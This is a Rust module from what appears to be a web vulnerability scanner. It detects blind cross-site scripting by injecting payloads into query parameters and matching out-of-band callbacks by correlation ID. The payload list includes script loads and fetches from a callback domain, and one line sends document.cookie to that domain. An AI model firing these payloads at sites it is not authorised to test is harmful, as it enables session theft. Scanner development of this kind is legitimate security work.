// Enhanced Blind XSS Detection Module
// Out-of-band detection with unique correlation IDs

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::payload::injector::inject_query_param;
use crate::reporting::model::{Finding, Severity};
use reqwest::Method;
use std::collections::HashMap;
use url::Url;

#[derive(Debug, Clone)]
pub struct BlindXssProbe {
    pub id: String,
    pub endpoint: String,
    pub parameter: String,
    pub payload: String,
    pub timestamp: u64,
}

pub struct BlindXssEngine {
    pub callback_domain: String,
    pub probes: HashMap<String, BlindXssProbe>,
}

impl BlindXssEngine {
    pub fn new(callback_domain: String) -> Self {
        Self {
            callback_domain,
            probes: HashMap::new(),
        }
    }
    
    /// Inject blind XSS payloads with unique IDs
    pub async fn inject(
        &mut self,
        client: &HttpClient,
        base_url: &Url,
        param: &str,
    ) -> anyhow::Result<()> {
        let id = generate_unique_id();
        
        // Generate multiple blind XSS payloads
        let payloads = vec![
            format!("<script src=//{}/{}></script>", self.callback_domain, id),
            format!("<img src=//{}/{}?img=1>", self.callback_domain, id),
            format!("<script>fetch('//{}/{}?fetch=1')</script>", self.callback_domain, id),
            format!("<script>new Image().src='//{}/{}?cookie='+document.cookie</script>", self.callback_domain, id),
        ];
        
        for payload in payloads {
            let url = inject_query_param(base_url, param, &payload)?;
            let req = HttpRequest::new(Method::GET, url);
            client.execute(req).await?;
            
            self.probes.insert(
                id.clone(),
                BlindXssProbe {
                    id: id.clone(),
                    endpoint: base_url.path().to_string(),
                    parameter: param.to_string(),
                    payload: payload.clone(),
                    timestamp: current_timestamp(),
                },
            );
        }
        
        Ok(())
    }
    
    /// Poll the shared OOB interaction log and confirm any blind-XSS probe whose
    /// correlation ID has been observed in an inbound request (served by the
    /// built-in OOB listener). Returns the number of newly confirmed findings.
    pub fn check_received_callbacks(
        &self,
        reporter: &mut crate::reporting::reporter::Reporter,
    ) -> usize {
        let mut confirmed = 0;
        for id in self.probes.keys() {
            if crate::ssrf::oob::oob_was_hit(id) {
                self.confirm_callback(id, reporter);
                confirmed += 1;
            }
        }
        confirmed
    }

    /// Called when an OOB callback is received
    pub fn confirm_callback(
        &self,
        id: &str,
        reporter: &mut crate::reporting::reporter::Reporter,
    ) {
        if let Some(probe) = self.probes.get(id) {
            reporter.add(Finding {
                vuln_type: "XSS".to_string(),
                technique: "Blind XSS".to_string(),
                endpoint: probe.endpoint.clone(),
                parameter: Some(probe.parameter.clone()),
                confidence: 0.99,
                severity: Severity::Critical,
                evidence: format!(
                    "Blind XSS confirmed via out-of-band callback\n\
                    Correlation ID: {}\n\
                    Payload: {}\n\
                    Timestamp: {}",
                    probe.id, probe.payload, probe.timestamp
                ),
                http_method: "GET".to_string(),
                database: None,
                cwe: "CWE-79".to_string(),
                cvss_score: Some(9.5),
                description: "Blind Cross-Site Scripting vulnerability confirmed through out-of-band callback".to_string(),
                impact: "Critical: Allows persistent JavaScript execution affecting multiple users".to_string(),
                remediation: "Implement output encoding and Content Security Policy".to_string(),
                references: vec![
                    "https://owasp.org/www-community/attacks/Blind_XSS".to_string(),
                ],
                payload_sample: Some(probe.payload.clone()),
            });
        }
    }
}

fn generate_unique_id() -> String {
    use std::sync::atomic::{AtomicU64, Ordering};
    // Monotonic counter guarantees uniqueness even within the same second; the
    // timestamp alone collided for IDs generated back-to-back.
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let timestamp = current_timestamp();
    let seq = COUNTER.fetch_add(1, Ordering::Relaxed);
    format!("BXSS{}{:x}", timestamp, seq)
}

fn current_timestamp() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_id_generation() {
        let id1 = generate_unique_id();
        let id2 = generate_unique_id();
        assert_ne!(id1, id2);
        assert!(id1.starts_with("BXSS"));
    }
}
